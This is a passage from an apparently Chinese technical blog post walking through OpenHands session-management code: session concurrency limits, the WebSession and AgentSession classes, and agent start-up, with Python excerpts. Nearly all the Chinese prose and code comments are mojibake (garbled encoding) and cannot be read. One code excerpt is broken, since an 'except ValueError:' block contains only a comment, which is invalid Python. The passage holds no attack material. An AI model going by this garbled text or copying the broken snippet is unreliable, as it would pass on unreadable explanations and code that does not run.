<li><strong>å¼æ­¥éé»å¡è®¾è®¡</strong>ï¼Agentåå§åï¼<code>session.initialize_agent</code>ï¼éè¿ <code>asyncio.create_task</code> å¼æ­¥æ§è¡ï¼ä¸é»å¡ä¼è¯åå»ºæµç¨ï¼æåç³»ç»ååéã</li>
<li><strong>äºä»¶é©±å¨æ©å±</strong>ï¼èªå¨è®¢éä¼è¯äºä»¶æµï¼éè¿åè°å½æ°ååºä¼è¯æ´æ°ï¼æ¯æåç»­æ©å±çæ§ãç»è®¡ç­åè½ï¼å·å¤è¯å¥½çå¯æ©å±æ§ã</li>
<li><strong>å®¹éä¸å¼å®¹æ§</strong>ï¼å¤çéå¤è®¢éå¼å¸¸ï¼é¿åæ¥éï¼æ¯æä¼è¯åæ¾ï¼<code>replay_json</code>ï¼ååå§æ¶æ¯ï¼<code>initial_user_msg</code>ï¼ï¼ééæ­£å¸¸å¯¹è¯ãåæ¾ç­å¤ç§åºæ¯ã</li>
</ol>
<p>_start_agent_loop ä»£ç å¦ä¸ã</p>
<pre><code class="language-python">    async def _start_agent_loop(
        self,
        sid: str,
        settings: Settings,
        user_id: Optional[str] = None,
        initial_user_msg: Optional[MessageAction] = None,
        replay_json: Optional[str] = None,
    ) -&gt; Session:
        """
        åé¨æ¹æ³ï¼å®éåå»ºå¹¶å¯å¨Agentå¾ªç¯ï¼åå«å¹¶åæ§å¶ãä¼è¯åå§åãäºä»¶è®¢éç­æ ¸å¿æµç¨ã
        """
        # 1. å¹¶åä¼è¯æ°éæ§å¶ï¼æ£æ¥ç¨æ·å½åæ´»è·ä¼è¯æ°æ¯å¦è¶è¿ä¸é
        # è·åç¨æ·å½åè¿è¡ä¸­çææä¼è¯ID
        running_session_ids = await self.get_running_agent_loops(user_id)
        # è¥è¶è¿æå¤§å¹¶åæ°ï¼å³é­ææ©çä¼è¯ä»¥éæ¾èµæº
        if len(running_session_ids) &gt;= self.config.max_concurrent_conversations:
           
            # è·åç¨æ·çä¼è¯å­å¨å®ä¾ï¼è¯»åæææ´»è·ä¼è¯çåæ°æ®
            conversation_store = await self._get_conversation_store(user_id)
            conversations = await conversation_store.get_all_metadata(running_session_ids)
            # ææåæ´æ°æ¶é´æåºï¼ææ°çå¨åï¼ oldestçå¨åï¼
            conversations.sort(key=_last_updated_at_key, reverse=True)

            # å¾ªç¯å³é­ææ©çä¼è¯ï¼ç´å°å¹¶åæ°ç¬¦åéå¶
            while len(conversations) &gt;= self.config.max_concurrent_conversations:
                oldest_conversation = conversations.pop()  # ååºææ©çä¼è¯
                oldest_sid = oldest_conversation.conversation_id
               
                # åå®¢æ·ç«¯åééè¯¯éç¥ï¼åç¥ä¼è¯å·²å³é­ï¼
                status_update = {
                    'status_update': True,
                    'type': 'error',
                    'id': 'AGENT_ERROR$TOO_MANY_CONVERSATIONS',
                    'message': 'åæ¶å¼å¯çä¼è¯æ°å·²è¾¾ä¸éãè¥ä»éä½¿ç¨è¯¥ä¼è¯ï¼å¯åéæ¶æ¯éæ°æ¿æ´»Agent',
                }
                # å¨äºä»¶å¾ªç¯ä¸­åéSocketIOäºä»¶ï¼å®åå°è¯¥ä¼è¯çæ¿é´ï¼
                await run_in_loop(
                    self.sio.emit(
                        'oh_event',
                        status_update,
                        to=ROOM_KEY.format(sid=oldest_sid),  # æä¼è¯IDå®ååé
                    ),
                    self._loop,
                )
                
                # å³é­ææ©çä¼è¯ï¼éæ¾èµæºï¼
                await self.close_session(oldest_sid)

        # 2. åå§åæ ¸å¿ç»ä»¶ï¼LLMæ³¨åè¡¨ãå¯¹è¯ç»è®¡ãæç»éç½®
        llm_registry, conversation_stats, final_config = (
            create_registry_and_conversation_stats(self.config, sid, user_id, settings)
        )
        
        # 3. åå»ºSessionå®ä¾ï¼å°è£ä¼è¯çææç¶æåç»ä»¶ï¼
        session = Session(
            sid=sid,
            file_store=self.file_store,  # ç»å®æä»¶å­å¨
            config=final_config,  # ç»å®æç»éç½®
            llm_registry=llm_registry,  # ç»å®LLMæ³¨åè¡¨
            conversation_stats=conversation_stats,  # ç»å®å¯¹è¯ç»è®¡
            sio=self.sio,  # ç»å®SocketIOå®ä¾
            user_id=user_id,  # ç»å®ç¨æ·ID
        )
        
        # 4. å°æ°ä¼è¯ç¼å­å°æ¬å°ï¼ä¾åç»­å¤ç¨ï¼
        self._local_agent_loops_by_sid[sid] = session
        
        # 5. å¼æ­¥åå§åAgentï¼ä¸é»å¡å½åæµç¨ï¼ï¼å è½½Agentãå¤çåå§æ¶æ¯ãåæ¾ä¼è¯ï¼è¥æï¼
        asyncio.create_task(
            session.initialize_agent(settings, initial_user_msg, replay_json)
        )
        
        # 6. è®¢éä¼è¯äºä»¶æµï¼çå¬ä¼è¯æ´æ°äºä»¶ï¼ä»æ°å»ºä¼è¯æ¶è®¢éï¼å¤ç¨ä¼è¯è·³è¿ï¼
        try:
            session.agent_session.event_stream.subscribe(
                subscriber=EventStreamSubscriber.SERVER,  # è®¢éèç±»åï¼æå¡å¨
                callback=self._create_conversation_update_callback(
                    user_id, sid, settings, llm_registry  # ä¼è¯æ´æ°åè°å½æ°
                ),
                callback_id=UPDATED_AT_CALLBACK_ID,  # åè°IDï¼ç¨äºåç»­åæ¶è®¢éï¼
            )
        except ValueError:
            # è¥å·²å­å¨ç¸åIDçè®¢éï¼å¿½ç¥è¯¥æä½ï¼é¿åéå¤è®¢éï¼

        # è¿ååå»ºå¥½çSessionå®ä¾
        return session
</code></pre>
<h3 id="22-sessionpywebsession">2.2 session.pyï¼WebSessionï¼</h3>
<p>session.py å®ä¹äº WebSession ç±»ï¼å®æ¯ OpenHands ç³»ç»ä¸­ç®¡ç Web å®¢æ·ç«¯ä¼è¯çæ ¸å¿ç»ä»¶ã</p>
<h4 id="221-websession-ç±»æ¦è¿°">2.2.1 WebSession ç±»æ¦è¿°</h4>
<p>WebSession æ¯ä¸ä¸ª Web æå¡å¨ç»å®çä¼è¯åè£å¨ï¼è´è´£ç®¡çåä¸ª Web å®¢æ·ç«¯è¿æ¥å¹¶åè° AgentSession çå½å¨æãWebSession çå³é®è®¾è®¡æ¨¡å¼ä¸ºï¼</p>
<ul>
<li>å¼æ­¥éåæ¨¡å¼ï¼ä½¿ç¨ asyncio.Queue ç®¡çäºä»¶åå¸ï¼ç¡®ä¿éé»å¡æä½</li>
<li>äºä»¶é©±å¨æ¶æï¼éè¿äºä»¶è®¢é/åå¸æºå¶å®ç°ç»ä»¶è§£è¦</li>
<li>ç¶æç®¡çæ¨¡å¼ï¼è·è¸ªä¼è¯ç¶æåè¿æ¥ç¶æ</li>
<li>éè¯¯å¤çæºå¶ï¼å¨é¢çå¼å¸¸æè·åéè¯¯æ¥å</li>
</ul>
<p>WebSession æ¯ OpenHands ç³»ç»ä¸­è¿æ¥åç«¯ç¨æ·çé¢ååç«¯Agentæ§è¡çæ ¸å¿æ¡¥æ¢ï¼è´è´£åè°æ´ä¸ªäº¤äºæµç¨ã</p>
<h4 id="222-websession-æ ¸å¿å±æ§">2.2.2 WebSession æ ¸å¿å±æ§</h4>
<p>WebSession æ ¸å¿å±æ§ä¸ºï¼</p>
<ul>
<li>sidï¼ç¨³å®çä¼è¯ IDï¼è·¨ä¼ è¾ä¿æä¸è´</li>
<li>sioï¼Socket.IO æå¡å¨ï¼ç¨äºå Web å®¢æ·ç«¯åéäºä»¶</li>
<li>agent_sessionï¼æ ¸å¿Agentä¼è¯ï¼åè°è¿è¡æ¶å LLM</li>
<li>configï¼ææç OpenHands éç½®</li>
<li>llm_registryï¼è´è´£ LLM è®¿é®åéè¯é©å­çæ³¨åè¡¨</li>
<li>file_storeï¼ä¼è¯çæä»¶å­å¨æ¥å£</li>
<li>user_idï¼å¯éçå¤ç§æ·ç¨æ·æ è¯ç¬¦</li>
</ul>
<p>WebSessionä¼è®¢é EventStreamSubscriber.SERVERã</p>
<pre><code class="language-python">class WebSession:
    """Web server-bound session wrapper.

    This was previously named `Session`. We keep `Session` as a compatibility alias
    (see openhands.server.session.__init__) so downstream imports/tests continue to
    work. The class manages a single web client connection and orchestrates the
    AgentSession lifecycle for that conversation.
    """

    sid: str
    sio: socketio.AsyncServer | None
    last_active_ts: int = 0
    is_alive: bool = True
    agent_session: AgentSession
    loop: asyncio.AbstractEventLoop
    config: OpenHandsConfig
    llm_registry: LLMRegistry
    file_store: FileStore
    user_id: str | None
    logger: LoggerAdapter
</code></pre>
<h4 id="223-ä¸»è¦åè½æ¨¡å">2.2.3 ä¸»è¦åè½æ¨¡å</h4>
<p>WebSession çä¸»è¦åè½æ¨¡åä¸ºï¼</p>
<ul>
<li>åå§ååéç½®ç®¡ç
<ul>
<li>init æ¹æ³è®¾ç½®ä¼è¯çåºæ¬éç½®åç»ä»¶</li>
<li>è®¢é EventStream ç SERVER äºä»¶</li>
<li>åå§åå¼æ­¥äºä»¶åå¸éå</li>
<li>Agentåå§åï¼initialize_agentï¼</li>
<li>éç½®AgentãLLM åè¿è¡æ¶ç¯å¢</li>
<li>å¤ç MCPï¼Model Context Protocolï¼éç½®</li>
<li>è®¾ç½® condenserï¼åç¼©å¨ï¼éç½®</li>
<li>å¯å¨ AgentSession</li>
<li>éè¯¯å¤çåéªè¯</li>
</ul>
</li>
</ul>
<ul>
<li>äºä»¶å¤çï¼on_event å _on_eventï¼
<ul>
<li>å¤çæ¥èªAgentçäºä»¶
<ul>
<li>è¿æ»¤ NullAction å NullObservation</li>
<li>æ ¹æ®äºä»¶æºå³å®å¦ä½å¤çåè½¬åäºä»¶</li>
<li>å°ç¯å¢åé¦ä½ä¸ºAgentäºä»¶åéç» UI</li>
</ul>
</li>
</ul>
</li>
<li>æ¶æ¯ååï¼dispatchï¼
<ul>
<li>å¤çæ¥èªç¨æ·çäºä»¶</li>
<li>éªè¯å¾åæ¯æ</li>
<li>å°äºä»¶æ·»å å°äºä»¶æµä¸­</li>
</ul>
</li>
<li>å¼æ­¥æ¶æ¯åéï¼send, _monitor_publish_queue, _sendï¼
<ul>
<li>ä½¿ç¨éåæºå¶å¼æ­¥åéæ¶æ¯</li>
<li>ç¡®ä¿ WebSocket è¿æ¥ç¨³å®åååé</li>
<li>å¤çè¿æ¥ç¶æåéè¯¯</li>
</ul>
</li>
<li>ç¶æç®¡ç
<ul>
<li>close æ¹æ³æ¸çä¼è¯èµæº</li>
<li>queue_status_message å _send_status_message å¤çç¶ææ´æ°æ¶æ¯</li>
</ul>
</li>
</ul>
<h4 id="224-ä¸ç³»ç»å¶ä»ç»ä»¶çå³ç³»">2.2.4 ä¸ç³»ç»å¶ä»ç»ä»¶çå³ç³»</h4>
<p>WebSession ä¸ç³»ç»å¶ä»ç»ä»¶çå³ç³»å¦ä¸ï¼</p>
<ul>
<li>
<p>ä¸ EventStream éæ</p>
<ul>
<li>ä½ä¸º SERVER è®¢éèæ¥æ¶äºä»¶</li>
<li>å¤çæ¥èªAgentåç¨æ·çäºä»¶æµ</li>
</ul>
</li>
<li>
<p>ä¸ AgentSession åä½ï¼</p>
<ul>
<li>ç®¡ç AgentSession çå½å¨æ</li>
<li>è½¬åç¨æ·äºä»¶å°Agent</li>
<li>å°Agentååºåéç»å®¢æ·ç«¯</li>
</ul>
</li>
<li>
<p>ä¸ Socket.IO éæï¼</p>
<ul>
<li>ä½¿ç¨ Socket.IO åå®¢æ·ç«¯åéå®æ¶äºä»¶</li>
<li>ç®¡ç WebSocket è¿æ¥ç¶æ</li>
</ul>
</li>
</ul>
<h4 id="225-åå§å-agentsession">2.2.5 åå§å AgentSession</h4>
<p>WebSession çåå§åä¼ä¸­å®æå¯¹<code>AgentSession</code>çåå§åï¼<code>AgentSession</code>çåå§åä¸­ååäº<code>EventStream</code>çåå§åï¼æä»¥æ´ä¸ªä¼è¯ç<code>EventStream</code>ä¹å°±æ¯å¨è¿éåå»ºçï¼è¿éå¨äºä»¶æµä¸­è®¢éäº<code>EventStreamSubscriber.SERVER</code>ï¼äºä»¶åè°å½æ°ä¸­å°éè¦ååç«¯å¹¿æ­çäºä»¶éè¿socketè¿è¡åéã</p>
<pre><code class="language-python">class WebSession:
    def __init__(
        self,
        sid: str,
        config: OpenHandsConfig,
        llm_registry: LLMRegistry,
        conversation_stats: ConversationStats,
        file_store: FileStore,
        sio: socketio.AsyncServer | None,
        user_id: str | None = None,
    ):
        self.sid = sid
        self.sio = sio
        self.last_active_ts = int(time.time())
        self.file_store = file_store
        self.logger = OpenHandsLoggerAdapter(extra={'session_id': sid})
        self.llm_registry = llm_registry
        self.conversation_stats = conversation_stats
        self.agent_session = AgentSession(
            sid,
            file_store,
            llm_registry=self.llm_registry,
            conversation_stats=conversation_stats,
            status_callback=self.queue_status_message,
            user_id=user_id,
        )
        self.agent_session.event_stream.subscribe(
            EventStreamSubscriber.SERVER, self.on_event, self.sid
        )
        self.config = config

        # Lazy import to avoid ircular dependency
        from openhands.experiments.experiment_manager import ExperimentManagerImpl

        self.config = ExperimentManagerImpl.run_config_variant_test(
            user_id, sid, self.config
        )
        self.loop = asyncio.get_event_loop()
        self.user_id = user_id

        self._publish_queue: asyncio.Queue = asyncio.Queue()
        self._monitor_publish_queue_task: asyncio.Task = self.loop.create_task(
            self._monitor_publish_queue()
        )
        self._wait_websocket_initial_complete: bool = True
</code></pre>
<p><code>agent_session.start()</code>ä¸­å®æäºsecurity_analyzerãruntimeãmemoryãcontrollerçåå§åã</p>
<h3 id="23-agent_session">2.3 agent_session</h3>
<h4 id="231-agentsession">2.3.1 AgentSession</h4>
<p><code>AgentSession</code> æ¯ OpenHands æ¡æ¶ä¸­ <strong>Agentè¿è¡ç âä¸ä¸æå®¹å¨â</strong>ï¼æ ¸å¿ä½ç¨æ¯å°è£Agentæ§è¡æéçææç»ä»¶ï¼Agentãæ§å¶å¨ãè¿è¡æ¶ãåå­ãäºä»¶æµï¼ï¼ç»ä¸ç®¡çå®ä»¬ççå½å¨æï¼åå§åãå¯å¨ãéä¿¡ãå³é­ï¼ï¼å¹¶æä¾ä¼è¯çº§çéç½®éç¦»ãæ°æ®æä¹ååç¶æç®¡çï¼æ¯Agentè½å¤ç¬ç«ãç¨³å®æ§è¡ä»»å¡çåºç¡ã</p>
<p>AgentSession æ ¸å¿ç¹è²å¦ä¸ï¼</p>
<ol>
<li><strong>å¨ç»ä»¶çå½å¨æç®¡ç</strong>ï¼éä¸­åå§åå¹¶å³èAgentãæ§å¶å¨ãè¿è¡æ¶ãåå­ãäºä»¶æµç­æ ¸å¿ç»ä»¶ï¼ç¡®ä¿ç»ä»¶é´éä¿¡é¡ºçï¼çå½å¨æä¸è´ï¼å¯å¨ / å³é­åæ­¥ï¼ã</li>
<li><strong>çµæ´»çç¯å¢éç½®</strong>ï¼æ¯æ Git ä»åºéæãèªå®ä¹å¯é¥æ³¨å¥ãMCP å·¥å·æ©å±ç­ï¼ééä»£ç å¼åãç¬¬ä¸æ¹æå¡è°ç¨ç­å¤æåºæ¯ï¼æ»¡è¶³å¤æ ·åä»»å¡éæ±ã</li>
<li><strong>ä¼è¯ç¶æå®å¨ç®¡æ§</strong>ï¼ä¸¥æ ¼æ ¡éªä¼è¯ç¶æï¼é¿åéå¤å¯å¨ãå·²å³é­ä¼è¯å¯å¨å¤±è´¥ï¼ï¼éè¿ç¶ææ è®°ï¼<code>_starting</code>/<code>_closed</code>ï¼ç¡®ä¿æµç¨å®å¨æ§ï¼åå°å¼å¸¸ã</li>
<li><strong>æ¯æä¼è¯åæ¾ä¸ç¶ææ¢å¤</strong>ï¼æä¾ <code>_run_replay</code> æ¥å£æ¯æä» JSON æ°æ®æ¢å¤åå²ä¼è¯ï¼ä¾¿äºè°è¯ãä»»å¡ç»­è·ååºæ¯å¤ç°ã</li>
<li><strong>ç²¾ç»åæ¥å¿ä¸çæ§</strong>ï¼éæå¸¦ä¼è¯ä¸ä¸æçæ¥å¿å¨ï¼è®°å½å¯å¨èæ¶ãæåç¶æãç¶ææ¢å¤ç­åæ°æ®ï¼ä¾¿äºé®é¢ææ¥åç³»ç»çæ§ã</li>
<li><strong>å®å¨ä¸éç¦»è®¾è®¡</strong>ï¼éè¿èªå®ä¹å¯é¥å¤çå¨ï¼<code>UserSecrets</code>ï¼å®å¨ç®¡çç¬¬ä¸æ¹å¯é¥ï¼è¿è¡æ¶ç¯å¢éç¦»æ§è¡ä»£ç ï¼é¿åææä¿¡æ¯æ³é²åç³»ç»é£é©ã</li>
<li><strong>ç¶æé©±å¨çäºä»¶æºå¶</strong>ï¼å¯å¨æ¶æ ¹æ®æ¯å¦æåå§æ¶æ¯èªå¨è®¾ç½®Agentç¶æï¼è¿è¡ä¸­ / ç­å¾ç¨æ·è¾å¥ï¼ï¼å¹¶éè¿äºä»¶æµåæ­¥ç¶æï¼ç¡®ä¿ç»ä»¶é´ç¶æä¸è´æ§ã</li>
</ol>
<p>AgentSession å®ä¹å¦ä¸ï¼</p>
<pre><code class="language-python">class AgentSession:
    """
        Agentä¼è¯ç±»ï¼å°è£Agentè¿è¡çå®æ´ä¸ä¸æï¼ç®¡çAgentãæ§å¶å¨ãè¿è¡æ¶ãåå­ç­æ ¸å¿ç»ä»¶ççå½å¨æã
        å±æ§è¯´æï¼
        controller: Agentæ§å¶å¨å®ä¾ï¼è´è´£è°åº¦Agentæ§è¡æµç¨ï¼
        sid: ä¼è¯å¯ä¸æ è¯
        user_id: ç¨æ·IDï¼å¯éï¼
        event_stream: äºä»¶æµï¼ç»ä»¶é´éä¿¡æ ¸å¿ï¼
        llm_registry: LLMæ³¨åè¡¨ï¼ç®¡çLLMå®ä¾ï¼
        file_store: æä»¶å­å¨ï¼æä¹åä¼è¯æ°æ®ï¼
        runtime: è¿è¡æ¶ç¯å¢ï¼å¦æ²çï¼æ§è¡ä»£ç /å½ä»¤ï¼
        memory: Agentåå­ï¼å­å¨ä¼è¯åå²ãä¸ä¸æç­ï¼
        _starting: ä¼è¯å¯å¨ä¸­æ è®°
        _started_at: ä¼è¯å¯å¨æ¶é´æ³
        _closed: ä¼è¯å³é­æ è®°
        loop: å¼æ­¥äºä»¶å¾ªç¯
        logger: å¸¦ä¼è¯ä¸ä¸æçæ¥å¿å¨
    """

    sid: str
    user_id: Optional[str]
    event_stream: EventStream
    llm_registry: LLMRegistry
    file_store: FileStore
    controller: Optional[AgentController] = None
    runtime: Optional[Runtime] = None

    memory: Optional[Memory] = None
    _starting: bool = False
    _started_at: float = 0
    _closed: bool = False
    loop: Optional[asyncio.AbstractEventLoop] = None
    logger: LoggerAdapter

    def __init__(
        self,
        sid: str,
        file_store: FileStore,
        llm_registry: LLMRegistry,
        conversation_stats: ConversationStats,
        status_callback: Optional[Callable] = None,
        user_id: Optional[str] = None,
    ) -&gt; None:
        """
        åå§åAgentSessionå®ä¾ã

        åæ°ï¼
            sid: ä¼è¯IDï¼å¯ä¸æ è¯ï¼
            file_store: æä»¶å­å¨å®ä¾ï¼ç¨äºäºä»¶æµãåå­æ°æ®æä¹åï¼
            llm_registry: LLMæ³¨åè¡¨å®ä¾ï¼æä¾LLMèµæºï¼
            conversation_stats: å¯¹è¯ç»è®¡å®ä¾ï¼è®°å½ä¼è¯ç¸å³ç»è®¡æ°æ®ï¼
            status_callback: ç¶æåè°å½æ°ï¼å¯éï¼ä¼è¯ç¶æåæ´æ¶è§¦åï¼
            user_id: ç¨æ·IDï¼å¯éï¼ç¨äºç¨æ·çº§æ°æ®éç¦»ï¼
        """
        self.sid = sid
        # åå§åäºä»¶æµï¼ä¼è¯åç»ä»¶éä¿¡çæ ¸å¿æ¢çº½ï¼
        self.event_stream = EventStream(sid, file_store, user_id)
        self.file_store = file_store
        self._status_callback = status_callback  # ç¶æåæ´åè°ï¼å¦éç¥å®¢æ·ç«¯ï¼
        self.user_id = user_id
        # åå§åå¸¦ä¼è¯ä¸ä¸æçæ¥å¿å¨ï¼ä¾¿äºè¿½è¸ªä¼è¯çº§æ¥å¿ï¼
        self.logger = OpenHandsLoggerAdapter(
            extra={'session_id': sid, 'user_id': user_id}
        )
        self.llm_registry = llm_registry  # ç»å®LLMæ³¨åè¡¨
        self.conversation_stats = conversation_stats  # ç»å®å¯¹è¯ç»è®¡å®ä¾

</code></pre>
<p>AgentSession åå§åå®æååäºä»¶æµä¸­æ·»å <code>ChangeAgentStateAction</code>äºä»¶ã</p>
<p><img alt="openhands-4.1-2" loading="lazy" data-src="https://img2024.cnblogs.com/blog/1850883/202602/1850883-20260201082209005-854493967.png" class="lazyload"></p>
<p>å·ä½ä»£ç å¦ä¸ï¼</p>
<pre><code class="language-python">    async def start(
        self,
        runtime_name: str,  # è¿è¡æ¶åç§°ï¼å¦"sandbox"ï¼æå®è¿è¡ç¯å¢ç±»åï¼
        config: OpenHandsConfig,  # æ¡æ¶å¨å±éç½®
        agent: Agent,  # å·²åå§åçAgentå®ä¾
        max_iterations: int,  # Agentæ§è¡çæå¤§è¿­ä»£æ¬¡æ°ï¼é²æ­¢æ éå¾ªç¯ï¼
        git_provider_tokens: Optional[PROVIDER_TOKEN_TYPE] = None,  # Gitæä¾åä»¤çï¼å¦GitHubä»¤çï¼
        custom_secrets: Optional[CUSTOM_SECRETS_TYPE] = None,  # èªå®ä¹å¯é¥ï¼ç¬¬ä¸æ¹æå¡è®¿é®ç¨ï¼
        max_budget_per_task: Optional[float] = None,  # åä»»å¡æå¤§é¢ç®ï¼å¯éï¼
        agent_to_llm_config: Optional[Dict[str, LLMConfig]] = None,  # Agent-LLMéç½®æ å°
        agent_configs: Optional[Dict[str, AgentConfig]] = None,  # ææAgentéç½®å­å¸
        selected_repository: Optional[str] = None,  # éä¸­çGitä»åºå°åï¼å¯éï¼
        selected_branch: Optional[str] = None,  # éä¸­çä»åºåæ¯ï¼å¯éï¼
        initial_message: Optional[MessageAction] = None,  # åå§ç¨æ·æ¶æ¯ï¼å¯éï¼
        conversation_instructions: Optional[str] = None,  # ä¼è¯æä»¤ï¼èªå®ä¹Agentè¡ä¸ºï¼
        replay_json: Optional[str] = None,  # ä¼è¯åæ¾JSONæ°æ®ï¼å¯éï¼
    ) -&gt; None:
        """
        å¯å¨Agentä¼è¯ï¼åå§åè¿è¡æ¶ãåå­ãæ§å¶å¨ï¼è§¦åAgentå¼å§æ§è¡ã
        
        æ ¸å¿æµç¨ï¼
        1. æ ¡éªä¼è¯ç¶æï¼é¿åéå¤å¯å¨ï¼
        2. åå»ºè¿è¡æ¶ç¯å¢ï¼å¦æ²çï¼
        3. éç½®Gitä»¤çãèªå®ä¹å¯é¥
        4. åå»ºAgentåå­ï¼å­å¨ä¸ä¸æãä¼è¯æä»¤ç­ï¼
        5. ï¼å¯éï¼æ·»å MCPå·¥å·å°Agent
        6. ï¼å¯éï¼æ§è¡ä¼è¯åæ¾
        7. åå»ºAgentæ§å¶å¨ï¼è°åº¦Agentæ§è¡ï¼
        8. åéåå§äºä»¶ï¼å¯å¨ç¶æ/ç­å¾ç¨æ·è¾å¥ï¼
        """
        # æ ¡éªä¼è¯ç¶æï¼å·²å­å¨æ§å¶å¨æè¿è¡æ¶ â æåºå¼å¸¸ï¼é¿åéå¤å¯å¨ï¼
        if self.controller or self.runtime:
            raise RuntimeError(
                'Session already started. You need to close this session and start a new one.'
            )

        # ä¼è¯å·²å³é­ â æ¥å¿è­¦åå¹¶è¿å
        if self._closed:
            self.logger.warning('Session closed before starting')
            return
        
        self._starting = True  # æ è®°ä¼è¯å¯å¨ä¸­
        started_at = time.time()
        self._started_at = started_at
        finished = False  # æ§è¡å®ææ è®°ï¼ç¨äºçæ§ï¼
        runtime_connected = False  # è¿è¡æ¶è¿æ¥æåæ è®°
        restored_state = False  # ç¶ææ¢å¤æ è®°ï¼ä¼è¯åæ¾/æ¢å¤åºæ¯ï¼
        
        # åå§åèªå®ä¹å¯é¥å¤çå¨ï¼ç®¡çç¬¬ä¸æ¹æå¡å¯é¥ï¼
        custom_secrets_handler = UserSecrets(
            custom_secrets=custom_secrets if custom_secrets else {}
        )

        try:
            # 1. åå»ºè¿è¡æ¶ç¯å¢ï¼å¦Dockeræ²çï¼å¹¶è¿æ¥
            runtime_connected = await self._create_runtime(
                runtime_name=runtime_name,
                config=config,
                agent=agent,
                git_provider_tokens=git_provider_tokens,
                custom_secrets=custom_secrets,
                selected_repository=selected_repository,
                selected_branch=selected_branch,
            )

            # æåä»åºç®å½åï¼è¥æå®äºGitä»åºï¼
            repo_directory = None
            if self.runtime and runtime_connected and selected_repository:
                repo_directory = selected_repository.split('/')[-1]  # ä»ä»åºå°åæåç®å½åï¼å¦"openhands"ï¼

            # 2. éç½®Gitæä¾åä»¤çï¼è¥æï¼
            if git_provider_tokens:
                provider_handler = ProviderHandler(provider_tokens=git_provider_tokens)
                await provider_handler.set_event_stream_secrets(self.event_stream)  # æ³¨å¥ä»¤çå°äºä»¶æµ

            # 3. éç½®èªå®ä¹å¯é¥ï¼è¥æï¼
            if custom_secrets:
                custom_secrets_handler.set_event_stream_secrets(self.event_stream)  # æ³¨å¥èªå®ä¹å¯é¥å°äºä»¶æµ

            # 4. åå»ºAgentåå­ï¼å­å¨ä¼è¯ä¸ä¸æãä»åºä¿¡æ¯ãä¼è¯æä»¤ç­ï¼
            self.memory = await self._create_memory(
                selected_repository=selected_repository,
                repo_directory=repo_directory,
                selected_branch=selected_branch,
                conversation_instructions=conversation_instructions,
                custom_secrets_descriptions=custom_secrets_handler.get_custom_secrets_descriptions(),  # å¯é¥æè¿°ï¼ä¾Agentåèï¼
                working_dir=config.workspace_mount_path_in_sandbox,  # æ²çä¸­çå·¥ä½ç®å½è·¯å¾
            )

            # 5. ï¼å¯éï¼æ·»å MCPå·¥å·å°Agentï¼éè¿è¡æ¶å·²è¿æ¥ä¸Agentå¯ç¨MCPï¼
            if self.runtime and runtime_connected and agent.config.enable_mcp:
                await add_mcp_tools_to_agent(agent, self.runtime, self.memory)

            # 6. ï¼å¯éï¼æ§è¡ä¼è¯åæ¾ï¼ä»replay_jsonæ¢å¤åå²ä¼è¯ï¼
            if replay_json:
                initial_message = self._run_replay(
                    initial_message,
                    replay_json,
                    agent,
                    config,
                    max_iterations,
                    max_budget_per_task,
                    agent_to_llm_config,
                    agent_configs,
                )
            # 7. ï¼æ­£å¸¸åºæ¯ï¼åå»ºAgentæ§å¶å¨ï¼è°åº¦Agentæ§è¡æµç¨ï¼
            else:
                self.controller, restored_state = self._create_controller(
                    agent,
                    config.security.confirmation_mode,  # å®å¨ç¡®è®¤æ¨¡å¼ï¼å¦èªå¨ç¡®è®¤/æå¨ç¡®è®¤ï¼
                    max_iterations,
                    max_budget_per_task=max_budget_per_task,
                    agent_to_llm_config=agent_to_llm_config,
                    agent_configs=agent_configs,
                )

            # 8. åéåå§äºä»¶ï¼æ ¹æ®æ¯å¦æåå§æ¶æ¯è®¾ç½®Agentç¶æï¼
            if not self._closed:
                if initial_message:
                    # æåå§æ¶æ¯ â åäºä»¶æµæ·»å ç¨æ·æ¶æ¯ï¼è®¾ç½®Agentç¶æä¸º"è¿è¡ä¸­"
                    self.event_stream.add_event(initial_message, EventSource.USER)
                    self.event_stream.add_event(
                        ChangeAgentStateAction(AgentState.RUNNING),
                        EventSource.ENVIRONMENT,
                    )
                else:
                    # æ åå§æ¶æ¯ â è®¾ç½®Agentç¶æä¸º"ç­å¾ç¨æ·è¾å¥"
                    self.event_stream.add_event(
                        ChangeAgentStateAction(AgentState.AWAITING_USER_INPUT),
                        EventSource.ENVIRONMENT,
                    )
            finished = True  # æ è®°æ§è¡å®æ

        finally:
            self._starting = False  # åæ¶å¯å¨ä¸­æ è®°
            # è®¡ç®å¯å¨ç»æï¼æ¯å¦æåï¼æ§è¡å®æä¸è¿è¡æ¶è¿æ¥æåï¼
            success = finished and runtime_connected
            duration = time.time() - started_at  # è®¡ç®å¯å¨èæ¶

            # æ¥å¿åæ°æ®ï¼ç¨äºçæ§ååæï¼
            # è®°å½å¯å¨ç»ææ¥å¿

</code></pre>
<h4 id="242-åå§åagent">2.4.2 åå§åAgent</h4>
<p>_start_agent_loop ä¼è°ç¨ initialize_agent åå§å Agentã<code>session</code>åå§åå®æåè°ç¨<code>initialize_agent</code>è¿ä¸æ­¥å®æagentçå¶ä½æ¨¡ååå§åå·¥ä½ï¼é¦ååå»ºllmåagentï¼ç¶åè°ç¨<code>agent_session.start()</code>ã</p>
<h5 id="æ ¸å¿ä½ç¨">æ ¸å¿ä½ç¨</h5>
<p><code>initialize_agent</code> æ¯ OpenHands æ¡æ¶ä¸­ <strong>Agentå®ä¾çåå§åæ ¸å¿æ¹æ³</strong>ï¼è´è´£å°ç¨æ·è®¾ç½®ãé»è®¤éç½®ãç¬¬ä¸æ¹æå¡éç½®èåä¸ºæç»è¿è¡éç½®ï¼åå»ºAgentå®ä¾å¹¶å¯å¨Agentä¼è¯ï¼æ¯è¿æ¥éç½®ä¸Agentè¿è¡çå³é®æ¡¥æ¢ï¼ç¡®ä¿Agentå·å¤å®æä»»å¡æéçææè½åï¼å·¥å·è®¿é®ãLLM æ¯æãå®å¨æ§å¶ç­ï¼ã</p>
<h5 id="æ ¸å¿ç¹è²">æ ¸å¿ç¹è²</h5>
<ol>
<li><strong>éç½®èåæºå¶</strong>ï¼ç¨æ·è®¾ç½®ä¼åäºé»è®¤éç½®ï¼æ¯æå®å¨ãæ²çãGitãç¬¬ä¸æ¹æå¡ç­å¤ç»´åº¦éç½®ççµæ´»è¦çï¼å¼é¡¾éç¨æ§ä¸ä¸ªæ§åéæ±ã</li>
